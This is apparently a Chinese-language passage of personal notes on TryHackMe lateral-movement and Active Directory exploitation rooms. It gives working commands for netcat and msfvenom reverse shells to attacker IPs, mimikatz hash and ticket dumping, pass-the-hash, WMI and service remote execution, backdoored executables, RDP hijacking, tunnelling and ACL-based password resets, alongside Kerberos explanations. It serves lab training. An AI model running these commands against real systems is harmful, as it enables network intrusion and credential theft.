4444;exploit&quot; # 使用指定用户凭据反弹 Shell 回来 runas /netonly /user:ZA.TRYHACKME.COM\\t1_leonard.summers &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4448&quot; # 用 sc 创建服务 sc.exe \\\\thmiis.za.tryhackme.com create THMservice-666 binPath= &quot;%windir%\\myservice666.exe&quot; start= auto sc.exe \\\\thmiis.za.tryhackme.com start THMservice-666 # 注意这个 flag 必须要通过服务生成的 Shell 才能执行 # 刚开始还以为和执行的用户有关 # whoami 是 SYSTEM 执行他也能出 flag # 尝试过 PSEXEC 和 nc 反弹 shell 都不行 # 生成普通马然后创建服务执行也不行 必须要服务马 # 执行 Flag.exe c:\\Users\\t1_leonard.summers\\Desktop\\Flag.exe 通过 WMI 横向移动WMI (Windows Management Instrumentation) 是 Windows 对 WBEM (Web-Based Enterprise Management) 的实现。WBEM 是一项用于跨设备访问管理信息的企业标准。 所有的操作都需要 Administrators 组的权限。 通过 PowerShell 连接 WMI同样要创建 PSCredential 对象。 1234$username = &#39;Administrator&#39;; $password = &#39;Mypass123&#39;; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; 可以通过下面的任意一个协议建立 WMI 会话 DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135&#x2F;TCP and ports 49152-65535&#x2F;TCP, just as explained when using sc.exe. Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS). 12$Opt = New-CimSessionOption -Protocol DCOM $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop New-CimSessionOption 是配置 WMI 会话连接参数，然后将选项和凭证传递给 New-CimSession cmdlet，以建立远程主机会话。 通过 WMI 远程创建进程 Ports: 135&#x2F;TCP, 49152-65535&#x2F;TCP (DCERPC) 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS) Required Group Memberships: Administrators 我们可以利用 Windows 管理工具（WMI）从 Powershell 远程启动进程，向 Win32_Process 类发送 WMI 请求，在我们之前创建的会话下启动进程。WMI 不会回显，不会看到任何输出 123456789101112131415# 创建 text.txt 写入 munrawashere $Command = &quot;powershell.exe -Command Set-Content -Path C:\\text.txt -Value munrawashere&quot;; # 执行小马 必须要完整路径 $Command = &quot;C:\\Windows\\payload.exe&quot;; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command } # 旧环境执行方法 wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create &quot;cmd.exe /c calc.exe&quot; # 我跑不起来 提示 Access denied wmic.exe /user:ZA.TRYHACKME.COM\\t1_corine.waters /password:Korine.1994 /node:THMIIS.za.tryhackme.com process call create &quot;C:\\Windows\\payload.exe&quot; 通过 WMI 远程创建服务12345678910111213141516171819202122232425# 创建一个 THMService2 的服务 Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = &quot;THMService2&quot;; DisplayName = &quot;THMService2&quot;; PathName = &quot;net user munra2 Pass123 /add&quot;; # Your payload ServiceType = [byte]::Parse(&quot;16&quot;); # Win32OwnProcess : Start service in a new process StartMode = &quot;Manual&quot; } # 创建一个执行小马的服务 Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = &quot;THMService2&quot;; DisplayName = &quot;THMService2&quot;; PathName = &quot;%windir%\\payload.exe&quot;; ServiceType = [byte]::Parse(&quot;16&quot;); StartMode = &quot;Manual&quot; } # 启动服务 $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#39;THMService2&#39;&quot; Invoke-CimMethod -InputObject $Service -MethodName StartService # 停止和删除服务 Invoke-CimMethod -InputObject $Service -MethodName StopService Invoke-CimMethod -InputObject $Service -MethodName Delete ServiceType &#x3D; [byte]::Parse(“16”) 是一个 PowerShell 表达式，用于指定 Windows 服务的类型。这里的 16 是一个代表特定服务类型的数值，它对应于 Windows API 中的 SERVICE_WIN32_OWN_PROCESS 常量。 在 Windows 服务编程中，服务的类型决定了服务如何运行： ServiceType = 16 (十六进制 0x10)：代表 SERVICE_WIN32_OWN_PROCESS。这意味着服务将以独立进程的形式运行，拥有自己独立的内存空间。这是最常见的服务类型，也是这里所使用的。 通过 WMI 远程创建计划任务1234567891011121314151617# Payload must be split in Command and Args $Command = &quot;cmd.exe&quot; $Args = &quot;/c net user munra22 aSdf1234 /add&quot; $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\\SYSTEM&quot; -TaskName &quot;THMtask2&quot; # 远程执行小马示例 $Command = &quot;%windir%\\payload.exe&quot; $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\\SYSTEM&quot; -TaskName &quot;THMtask2&quot; # 启动计划任务 Start-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot; # 删除计划任务 Unregister-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot; 通过 WMI 安装 MSI 包1234567Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\\Windows\\myinstaller.msi&quot;; Options = &quot;&quot;; AllUsers = $false} # 传统方式实现 wmic /node:TARGET /user:DOMAIN\\USER product call install PackageLocation=c:\\Windows\\myinstaller.msi # 同样跑不起来 Access Denied wmic /node:THMIIS.za.tryhackme.com /user:ZA.TRYHACKME.COM\\t1_corine.waters /password:Korine.1994 product call install PackageLocation=c:\\Windows\\myinstaller88.msi 实践12345678910111213141516171819202122232425# 创建 MSI 马 msfvenom -p windows/shell/reverse_tcp LHOST=10.50.46.241 LPORT=4444 -f msi &gt; myinstaller88.msi # 传 MSI 马 smbclient -c &#39;put myinstaller88.msi&#39; -U t1_corine.waters -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; Korine.1994 # 创建好 handler msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot; # 配好 WMI session # 注意我这里用的 Wsman 协议 官方 WP 是 DCOM $username = &#39;t1_corine.waters&#39;; $password = &#39;Korine.1994&#39;; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; $Opt = New-CimSessionOption -Protocol Wsman $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop # 执行 WMI 触发 payload Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\\Windows\\myinstaller88.msi&quot;; Options = &quot;&quot;; AllUsers = $false} # 这关也很奇怪，只能跟着 WP 来 # 自己的解法都拿不到 Flag # 执行 Flag.exe C:\\Users\\t1_corine.waters\\Desktop\\Flag.exe 使用替代身份验证材料标题的这个材料指的是在不知道用户密码的情况下，可以用来访问 Windows 账户的任何数据，这是由于 Windows 认证机制导致的，有以下两种认证机制。 NTLM authentication Kerberos authentication NTLM Authentication整个过程简单说就是服务器发一个 Challenge ，客户端通过自己的 Hash 值和发过来的 Challenge 产生一个 Response 发给服务器。服务器把收到的 Response 和产生的 Challenge 发给 DC，DC 那边存着用户的 NTML Hash，就再走一遍产生 Response 流程，看看产生的 Response 是不是和服务器发过来的一样，如果一样，就通过，不一样拒绝认证。 不过上述过程是域账户的过程，如果用的本地账户，在服务器本地就能验证这个 Response 了（因为存着账户的凭据）。 Pass-the-Hash 传递 Hash通过使用 mimikatz 或类似工具从获得管理权限的主机中提取凭证后，我们可能会得到明文密码或哈希值，这些密码或哈希值很容易被破解。不过，如果我们不够幸运，最终得到的 NTLM 密码哈希值也不会被破解。 虽然看起来我们无法真正使用这些哈希值，但只需知道密码哈希值，就能回应身份验证过程中发送的 NTLM 挑战。这意味着我们无需知道明文密码即可进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，我们就可以通过哈希值（PtH）成功进行身份验证，而不必破解 NTLM 哈希值。 要提取 NTLM 哈希值，我们可以使用 mimikatz 读取本地 SAM，或者直接从 LSASS 内存中提取哈希值。 以下命令都是在 mimikatz 工具里面执行的，记得提前传到机器里面。 123456789101112131415# 从本地 SAM 文件中提取 NTLM hash # 只能提取本地用户的 NTLM Hash privilege::debug token::elevate lsadump::sam # 从 LSASS 内存中提取 NTLM hash privilege::debug token::elevate sekurlsa::msv # 通过 hash 去注入反向 shell # PTH 需要在非管理员令牌的上下文中才能成功注入哈希并执行命令 token::revert sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot; Passing the Hash Using Linux12345# Connect to RDP using PtH xfreerdp3 /v:10.200.48.201 /u:za.tryhackme.com\\\\t1_toby.beck /pth:533f1bd576caa912bdb9da284bbc60fe # Connect via psexec using PtH # Note: Only the linux version of psexec support PtH. psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP Connect to WinRM using PtH: 1evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH Kerberos 认证认证过程 用户明文发送他的用户名和用它密码的 Hash 加密过的 timestamp 发送到 Key Distribution Center (KDC)。 KDC 会创建一个 Ticket Granting Ticket (TGT) 发送回来，他允许用户使用这个 ticket 去向 KDC 请求访问其他服务的 ticket，而不用传递他们的用户凭证。随着 TGT 发送的还有一个 Session Key，用户需要用它去生成后续的请求。 注意这个 TGT 是用 krbtgt 账户的密码 Hash 加密的，所以用户不能访问里面的内容。但加密的 TGT 里面带一份 Session Key，所以 KDC 不需要存储 Session Key ，因为他可以从 TGT 里面恢复出来。 当用户想要访问网络上的服务时，例如共享文件夹、网站或数据库，他们会使用TGT 向 KDC 请求 TGS (Ticket Granting Service)。TGS 是一种仅允许连接到为其创建的特定服务的 ticket。为了请求 TGS，用户会发送他们的 Session Key 加密的 用户名和 timestamp，作为 Authenticator。还有 TGT 和 Service Principal Name (SPN)。这个 SPN 标识了我们打算访问的服务和服务器名称。 KDC 会向我们发送一个 TGS 和一个用 Session Key 加密的 Service Session Key，我们需要用这两个密钥来验证我们要访问的服务。TGS 会用服务所有者的 Hash 进行加密，然后这个 TGS 也跟 TGT 类似，会带一份 Service Session Key，服务所有者可以用他自己的 Hash 来解密。 然后可以将TGS发送到所需的服务以进行身份验证和建立连接。该服务将使用其配置的帐户的密码哈希解密TGS并验证服务会话密钥。 解释一下：发送的 Username 和 Timestamp 构成的 Authenticator 是用 Service Session Key 加密的，服务可以用它自己的 Hash 从 TGS 解密出 Service Session Key，然后就可以来解密客户端发来的 Authenticator。 整个过程中，只有在请求 TGT 的时候，用户名没有加密，只加密 timestamp，其他的过程中都是把用户名和 timestamp 一起构成 Authenticator 。 认证过程简述1. AS (Authentication Service) 认证阶段 用户向 KDC 发送一个明文请求，其中包含他们的用户名和想要访问的服务主体名称 (SPN)，这个 SPN 在第一步是固定的，就是 krbtgt。 KDC 收到请求后，会查找该用户账户的密码哈希。它使用这个哈希来解密请求中的时间戳，如果解密成功，就验证了用户的身份。 KDC 随后会生成一个客户端会话密钥 (Client Session Key)，并用这个密钥来加密时间戳。 KDC 最后会用 krbtgt 账户的密码哈希加密一个 TGT (Ticket Granting Ticket)。这个 TGT 包含了客户端会话密钥、用户信息、有效时间等内容。 KDC 将加密的 TGT 和用用户密码哈希加密过的客户端会话密钥发送给用户。 用户收到后，用自己的密码哈希解密出客户端会话密钥，并保存它，但无法解密 TGT。 2. TGS (Ticket Granting Service) 认证阶段 用户现在想要访问其他服务。他们使用自己保存的客户端会话密钥来生成一个 Authenticator，这是一个动态生成的结构，包含用户名和时间戳等信息。 用户将这个加密的 Authenticator 和之前收到的 TGT (未解密) 以及想要访问服务的 SPN 一起发送给 KDC。 KDC 收到后，用 krbtgt 账户的密码哈希解密 TGT，从而提取出客户端会话密钥。 KDC 再用这个客户端会话密钥去解密 Authenticator。如果成功，就验证了用户是 TGT 的合法持有者。 KDC 随后会生成一个服务会话密钥 (Service Session Key)。 KDC 创建一个 TGS (Ticket Granting Service)，其中包含了服务会话密钥、用户信息和时间戳。这个 TGS 会用服务账户的密码哈希进行加密。 KDC 将加密的 TGS 和用客户端会话密钥加密过的服务会话密钥发送给用户。 用户收到后，用自己的客户端会话密钥解密出服务会话密钥，并保存它。 3. 服务验证阶段 用户现在拥有了 TGS 和服务会话密钥。 用户会生成另一个用服务会话密钥加密的 Authenticator，并与 TGS 一起发送给目标服务。 服务收到后，使用自己账户的密码哈希解密 TGS，成功后就拿到了服务会话密钥。 服务再用这个服务会话密钥去解密用户发送的 Authenticator。 如果所有验证都通过，服务就会确认用户身份合法，并允许访问。 Pass-the-Ticket 传递票据有些时候我们可以用 mimikatz 从 LSASS 内存中提取 Kerberos ticket 和 session keys，这个过程需要我们拥有 SYSTEM 权限，命令如下 123456# 下载 mimikatz curl -o mimikatz.exe http://10.50.46.241/mimikatz.exe # 提取 Ticket privilege::debug sekurlsa::tickets /export 如果我们只能访问 ticket，而不能访问 session key，那么这个 ticket 就没用。参考前面的认证过程，发送的 username 和 timestamp 要用 session key 进行加密构成 Authenticator。 虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT 感兴趣，因为它们可以用来请求访问允许用户访问的任何服务。同时，TGS 只适用于特定服务。提取 TGT 需要管理员凭证，而提取 TGS 则可以使用低权限账户（仅分配给该账户的权限）。 提取出所需的 ticket 后，我们就可以使用以下命令将 ticket 注入当前会话： 1kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi 在我们自己的会话中注入票据不需要管理员权限。之后，我们使用的任何横向移动工具都可以使用这些票据。要检查是否正确注入了票据，可以使用 klist 命令。 12345678910111213141516za\\bob.jenkins@THMJMP2 C:\\&gt; klist Current LogonId is 0:0x1e43562 Cached Tickets: (1) #0&gt; Client: Administrator @ ZA.TRYHACKME.COM Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize Start Time: 4/12/2022 0:28:35 (local) End Time: 4/12/2022 10:28:35 (local) Renew Time: 4/23/2022 0:28:35 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -&gt; PRIMARY Kdc Called: THMDC.za.tryhackme.com Overpass-the-hash &#x2F; Pass-the-Key这种攻击类型类似于 PtH，但他是作用在 Kerberos 上的。 当用户请求 TGT 时，他们会发送一个时间戳，该时间戳使用从密码中提取的加密密钥加密。根据安装的 Windows 版本和 Kerberos 配置，用于生成该密钥的算法可以是 DES（当前 Windows 版本默认禁用）、RC4、AES128 或 AES256。如果我们拥有这些密钥中的任何一个，就可以向 KDC 申请 TGT，而不需要实际密码，因此被称为 Pass-the-key (PtK)。 123456# 提取 Hash privilege::debug sekurlsa::ekeys # 弹一个目标用户权限的 Shell sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:&quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 5556&quot; 请注意，使用 RC4 时，密钥等于用户的 NTLM 哈希值。这意味着，如果我们能提取 NTLM 哈希值，只要 RC4 是启用的协议之一，我们就能用它来请求 TGT。这种特殊的变种通常被称为 Overpass-the-Hash (OPtH)。 实践房间的意思应该是我们看能不能提取 t1_toby.beck 的 Hash，然后用这个 Hash 去生成 TGT。 123456789101112131415# 提取 Hash privilege::debug sekurlsa::ekeys # 用 Hash 生成一个有目标用户权限的 Shell sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:&quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 5001&quot; # 拿到目标机器上的 Shell winrs.exe -r:THMIIS.za.tryhackme.com cmd # 直接执行 Flag.exe # 这里用 -i 能连上，但是可能是两层 Shell 的原因，命令不回显 psexec64.exe \\\\THMIIS.za.tryhackme.com C:\\Users\\t1_toby.beck\\Desktop\\Flag.exe # 这种方式不知道为什么执行 Flag 拿不到 python3 psexec.py t1_toby.beck@THMIIS.za.tryhackme.com -hashes :533f1bd576caa912bdb9da284bbc60fe 滥用用户行为在某些情况下，攻击者可以利用用户执行的操作进一步访问网络中的机器。 滥用可写共享托管在网络共享上的脚本或可执行文件的快捷方式，当用户执行这个快捷方式，可执行文件将从服务器复制到 %temp% 文件夹，并在工作站上执行。 后门 VBS 脚本1CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\10.10.28.6\\myshare\\nc64.exe %tmp% & %tmp%\\nc64.exe -e cmd.exe 1234\", 0, True 后门 EXE 程序1msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\\x00&quot; -f exe -o puttyX.exe RDP 劫持当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将在服务器上无限期地保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有 SYSTEM 权限，就可以接管任何现有的 RDP 会话，而无需密码。 12345678# 用 SYSTEM 账户的权限来启动一个 cmd.exe c:/tools/PsExec64.exe -s cmd.exe # 查询活动会话 query user # 连接会话 /dest: 是我们目前的会话 前面的数字 3 是我们要连接的会话 tscon 3 /dest:rdp-tcp#6 Windows Server 2019 及以上的系统就不允许连接到其他的用户会话了 端口转发我们介绍的大多数横向移动技术都需要特定端口供攻击者使用。在现实世界的网络中，管理员可能出于安全原因屏蔽了其中一些端口，或者在网络周围实施了隔离，从而阻止你访问 SMB、RDP、WinRM 或 RPC 端口。 要绕过这些限制，我们可以使用端口转发技术，即把任何被入侵的主机作为跳转箱，转到其他主机。由于企业中的每个角色对日常工作所需的网络服务都有不同的需求，因此预计某些机器会比其他机器拥有更多的网络权限。 SSH 隧道在被攻击机上往往没有 SSH 服务端，我们需要反向连回来打通隧道 123# 创建一个专门给隧道用的用户 useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser SSH 远程端口转发即把远程端口转移到本地，本地主动发起连接。 1234# 1.1.1.1 是攻击机的 IP # 3389:3.3.3.3:3389 攻击机端口:目的机器IP:目的端口 # -N 是不请求 shell ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N SSH 本地端口转发把本地端口转移到对面，对面主动发起连接。 1234567# *:80 监听所有网络接口的 80 端口 # 127.0.0.1:80 是攻击机的的本地回环地址和端口 # 也可以这样 192.168.244.1:8080 这样就转发到了攻击机的内网的机器上了 ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N # 因为开了一个 80 的监听端口，防火墙策略也要放开 netsh advfirewall firewall add rule name=&quot;Open Port 80&quot; dir=in action=allow protocol=TCP localport=80 socat 端口转发12345678910# 监听本地 1234 端口 把流量都转发到 1.1.1.1:4321 去 # fork 选项允许为每个收到的连接分叉一个新进程 # 如果不带这个参数一次连接就会断开了 socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321 # 转发内网机器3.3.3.3的 3389 端口暴露到本地 3389 端口 socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 # 添加防火墙规则 netsh advfirewall firewall add rule name=&quot;Open Port 3389&quot; dir=in action=allow protocol=TCP localport=3389 动态端口转发和 SOCKS其实这个有点误解人，我不太理解他的意思，看起来好像 SSH 自动开了一个 SOCKS 服务端一样，我也没有去尝试他。 1ssh tunneluser@1.1.1.1 -R 9050 -N RDP 转发实践123ssh za\\\\terence.lloyd@thmjmp2.za.tryhackme.com C:\\tools\\socat\\socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389 隧道复杂利用1234# SSH 端口转发 ssh tunneluser@10.50.46.241 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N # 开启 SSH 服务 sudo systemctl start ssh 执行 RCE 123456789101112131415161718msfconsole use rejetto_hfs_exec set payload windows/shell_reverse_tcp # 小马要在远端机器上访问的地址 set lhost thmjmp2.za.tryhackme.com # 强制监听地址是 127.0.0.1 如果不填的话，就是 LHOST 的值 set ReverseListenerBindAddress 127.0.0.1 # 跳板机 7878 端口转发到我们本地 7878 端口 set lport 7878 # Payload 监听地址 set srvhost 127.0.0.1 # Payload 监听端口 http://thmjmp2.za.tryhackme.com:6666/4pdqhjQTjbrGJW set srvport 6666 set rhosts 127.0.0.1 set rport 8888 exploit 拓展 Sshuttle Rpivot Chisel Hijacking Sockets with Shadowmove Exploiting Active Directory房间：https://tryhackme.com/room/exploitingad 时间：20250804 23:30 - 20250806 03:50 Exploiting Permission DelegationActive Directory 通过一个名为权限委派 (Permission Delegation) 的功能来委派权限和特权。一般只有很少的用户拥有 DA（域管理员）凭据的访问权限。不可能让他们处理所有来自用户的请求，例如重置他们的密码。通过使用委派，我们可以将强制更改用户密码的权限委派给 IT 服务台团队，这意味着他们现在对这个特定功能拥有了委派的特权。原则上，为了保证委派的安全性，应该遵循最小权限原则。 权限委派漏洞通常被称为 ACL-based attacks (基于 ACL 的攻击)。AD 允许管理员配置访问控制条目 (ACEs)，这些条目构成了自由访问控制列表 (DACLs)，因此得名 ACL-based attacks。几乎任何 AD 对象都可以通过 ACEs 进行安全保护，这些 ACEs 描述了其他 AD 对象对该目标对象拥有的允许和拒绝的权限。 如果 ACEs 配置错误，攻击者就可以从他们下手。如果 IT 支持团队被授予了对 Domain Users（域用户）组的 ForceChangePassword（强制更改密码）权限，这将被视为不安全的。虽然他们能够重置忘记密码的员工的密码，但这种配置错误也可能让他们重置特权账户的密码，比如那些属于 Domain Admins（域管理员）组的账户，从而实现权限提升。 ACEs大量的 ACEs 可能会被错误的配置，然后他们的利用方式也很多，Bloodhound 的文档可以帮助解释被枚举出来的 ACEs 以及如何利用它们。以下是几个典型的 ForceChangePassword: 我们能在不知道用户密码的情况下重置密码 AddMembers: 我们有将用户（包括当前用户），组和计算机加入目标组的权限。 GenericAll: 我们可以完全控制该对象，包括更改用户密码、注册 SPN 或向目标组添加 AD 对象。 GenericWrite: 我们可以更新目标对象的任何非保护参数。例如，这可以让我们更新 scriptPath 参数，从而在用户下次登录时执行脚本。 “非保护参数”（non-protected parameters）指的是那些不会被 AdminSDHolder 机制保护的属性。 简单来说，Active Directory 有一套内置的安全机制，叫做 AdminSDHolder，专门用来保护高权限账户和组（如 Domain Admins）。这个机制会定期检查这些高权限对象，并强制重置它们的 ACL，以防止权限被错误修改。 WriteOwner: 我们可以更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的更多权限。 WriteDACL: 我们可以向目标对象的 DACL 写入新的 ACE。例如，我们可以编写一个 ACE，授予我们的账户对目标对象的完全控制权。 AllExtendedRights: 我们可以对目标对象执行任何与扩展 AD 权限相关的操作。例如，这包括强制更改用户密码的功能。 为了利用这些 ACE，我们需要一种与 AD 交互的方法来发出这些请求。这方面的两个最佳选择是 AD-RSAT PowerShell cmdlets 或 PowerSploit。根据漏洞和环境中的检测工具，其中一种方法可能更隐蔽。在本任务中，我们将展示这两种方法。 Bloodhound因为我用的是提供执行好的文件，就没有自己跑 Sharphound 了，把结果导入 Bloodhound 后，搜索拿到的用户名。 在 Node Info -&gt; EXECUTION RIGHTS -&gt; Group Delegated RDP Privileges 看到 DOMAIN USERS 有能访问 THMWRK1 的 RDP 权限。 然后在 Node Info -&gt; OUTBOUND CONTROL RIGHTS -&gt; Group Delegated Object 看到 DOMAIN USERS 有对 IT SUPPORT 的 GenericWrite 权限。 然后我们一般是要拿到高权限用户的权限，所以用 BloodHound 的检索功能，把自己的账户放到首位，TIER 2 ADMINS@ZA.TRYHACKME.LOC 放到目标，生成一个图出来。 可以看到我们的用户组有对 IT SUPPORT 的 GenericWrite 权限，然后 IT SUPPORT 组有对 T2 组的强制改密码权限。当一个用户对一个组拥有 GenericWrite 权限时，就意味着他可以修改这个组的任何属性，包括 member 属性。 AddMember我们会用 AD-RSAT 工具集中的 Add-ADGroupMember PowerShell cmdlet 实现这个功能。 12345# 把我们的用户加入 IT Support 组 Add-ADGroupMember &quot;IT Support&quot; -Members &quot;barbara.reid&quot; # 查看 IT Support 组成员 Get-ADGroupMember -Identity &quot;IT Support&quot; 强制改密码现在我们的账户已经是 IT Support 组成员了，所以有对 Tier 2 组改密码的权限。 1234567891011# 查看 T2 管理员组成员 找一个受害者 Get-ADGroupMember -Identity &quot;Tier 2 Admins&quot; # 新建密码变量 $Password = ConvertTo-SecureString &quot;Pass123...&quot; -AsPlainText -Force # 更改密码 Set-ADAccountPassword -Identity &quot;t2_melanie.davies&quot; -Reset -NewPassword $Password # 如果提示拒绝，执行这个断开连接再连接 # 还不行就等 10 分钟左右 gpupdate /force Exploiting Kerberos DelegationKerberos Double Hop issue客户端希望使用 Kerberos 对第一台服务器（Hop 1）进行身份验证，而第一台服务器需要代表客户端访问第二台服务器（Hop 2）上的资源。常见的情况是用户访问前端应用程序时需要修改数据库服务器上的资源。 原始的 Kerberos 无法告诉第一台服务器：”OK，你可以访问服务器上的资源了： “您可以代表客户访问第 2 服务器上的资源。” 原始 Kerberos 协议的局限性原始 Kerberos 协议的流程是这样的： 用户向 KDC (密钥分发中心) 证明自己的身份，并获得一个 TGT (票据授权票据)。 用户使用这个 TGT 向 KDC 请求一个专门用于访问 Hop 1 服务器的 TGS (服务票据)。 用户使用这个 TGS 向 Hop 1 服务器进行身份验证，并开始通信。 到这里，整个流程就结束了。Kerberos 的设计只考虑了客户端（用户）和第一个服务器（Hop 1）之间的通信。 为什么不能简单地转发 TGS？ TGS 的加密机制：用户从 KDC 获得的 TGS 是用 Hop 1 服务器的密钥加密的。只有 Hop 1 服务器能解密它，并从中获得会话密钥。 无法将 TGS 转发给 Hop 2：Hop 2 服务器无法解密这个 TGS，因为它没有 Hop 1 服务器的密钥。因此，用户不能简单地将 TGS 转发给 Hop 2。 权限绑定：TGS 明确绑定了一个用户和一个特定服务。它不包含任何“代表他人”去访问其他服务的权限。原始协议没有“委托（delegation）”的概念。 解决方案：Kerberos 委派（Kerberos Delegation）为了解决这个问题，微软和其他组织对 Kerberos 协议进行了扩展，引入了 Kerberos 委派的功能。 委派的核心思想是允许服务（例如 Hop 1 服务器）以用户的身份去向 KDC 请求一个新的 TGS，这个新的 TGS 是专门用于访问其他服务（例如 Hop 2 服务器）的。 这就是为什么现在有非约束性委派 (Unconstrained Delegation) 和约束性委派 (Constrained Delegation) 等多种委派形式。它们都是对原始 Kerberos 协议的增强，专门用于处理多跳的身份验证场景。 Constrained vs UnconstrainedKerberos 委派有两种类型。在 Kerberos 委派最初的实现中，使用了非约束性委派 (Unconstrained Delegation)，这是最不安全的方法。 本质上，非约束性委派对委派没有施加任何限制。它的后台工作原理是：如果一个设置了 TRUSTED_FOR_DELEGATION 标志的用户在一个配置了非约束性委派的主机上进行身份验证，那么就会为这个用户账户生成一个 TGT，并将其存储在主机的内存中，以便将来需要时使用。 假设攻击者能够攻陷一个启用了非约束性委派的主机，他们就可以尝试强制一个特权账户（如域管理员）向该主机进行身份验证，这使他们能够拦截生成的 TGT，并冒充这个特权服务。如果你想看一个非约束性委派利用的例子，可以看这里。 为了克服无约束委托的安全缺陷，微软在 2003 年推出了受限委托。受限委托限制了账户可以委托给哪些服务，从而在账户受到威胁时限制了风险。以下是可配置授权的服务示例： HTTP - 用于 Web 应用程序，允许使用 AD 凭据进行直通式（pass-through）身份验证。 CIFS - Common Internet File System，用于文件共享，允许将用户委派到文件共享。 LDAP - 用于委派给 LDAP 服务，执行诸如重置用户密码之类的操作。 HOST - 允许将账户委派给主机上的所有活动。 MSSQL - 允许将用户账户委派给 SQL 服务，以进行数据库的直通式身份验证。 利用约束性委派通常比利用非约束性委派更复杂，因为被委派的账户不能被用于访问所有东西。如果我们能拿到一个有约束性委派的 AD 账户的话。知道他的明文密码甚至他的 NTLM hash，我们能生成这个账户的 TGT。然后我们可以使用这个 TGT 来为任何非敏感的用户账户执行一个 TGS 请求，以便以该用户的身份访问服务。 整个过程简单说是这样的： 攻击者：掌握了服务账户的密码。 攻击者利用这个服务账户的权限，伪造一个代表用户 A的票据。 攻击者使用这个伪造的票据，去向 KDC 申请一个冒充用户 A访问服务 B的票据。 冒充过程（攻击流程）这个过程是利用了 Kerberos 的两个扩展协议：S4U2self 和 S4U2proxy。攻击者在拥有了配置了约束性委派的服务账户凭据（密码或 NTLM 哈希）后，可以执行以下步骤： 生成服务账户的 TGT： 攻击者首先使用窃取的服务账户的凭据（密码或 NTLM 哈希），向 KDC（密钥分发中心）请求一个该服务账户的 TGT。有了这个 TGT，攻击者就完全拥有了这个服务账户的身份。 执行 S4U2self 请求（伪造身份）： 攻击者现在以被攻陷的服务账户的身份，向 KDC 发出请求。这个请求的目的是**“代表”另一个用户 A**（即你说的“非敏感用户账户”），向 KDC 请求一个服务票据（TGS），但这个 TGS 是用于访问自己（服务账户本身）的。KDC 看到这个请求后，会检查服务账户是否被信任用于委派（即是否设置了TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 标志）。如果设置了，KDC 会信任这个请求，并为用户 A生成一个有效的、可转发的 TGS。这个 TGS 相当于 KDC 认可的一个**“用户 A 的身份凭证”**。 执行 S4U2proxy 请求（冒充访问）： 攻击者拿到上一步获得的**“用户 A 的身份凭证”后，再次向 KDC 